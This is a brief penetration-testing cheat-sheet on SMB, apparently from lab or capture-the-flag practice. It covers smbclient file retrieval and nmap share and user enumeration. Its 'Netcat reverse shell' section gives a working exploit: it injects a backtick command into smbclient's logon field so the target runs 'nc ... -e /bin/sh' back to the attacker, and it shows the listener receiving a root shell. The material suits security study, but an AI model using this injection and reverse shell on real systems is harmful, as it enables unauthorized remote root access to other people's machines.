# SMB

## Basic

__SMBClient__
```shell
## Connect and run commands; kinda like FTP connect
smbclient \\\\10.10.161.57\\pics
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.

smb: \> 
smb: \> get corgo2.jpg 
getting file \corgo2.jpg of size 42663 as corgo2.jpg (195.6 KiloBytes/sec) (average 195.6 KiloBytes/sec)
```

## Extra

### Netcat reverse shell

_Only effective if smbclient has __logon__ capability; after `smbclient` connects, then `smb:> help` shows.

T1
```console
$ smbclient \\\\10.10.10.3\\tmp --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
smb: \> logon "/=`nohup nc -nv 10.10.14.36 4444 -e /bin/sh`"
Password: 
```
T2
```console
$ nc -lvp 4444
listening on [any] 4444 ...
10.10.10.3: inverse host lookup failed: Unknown host
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.3] 44881
whoami
root
```

__Nmap enumeration__

```shell
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.161.57 | tee nmap-smb-enum.txt
```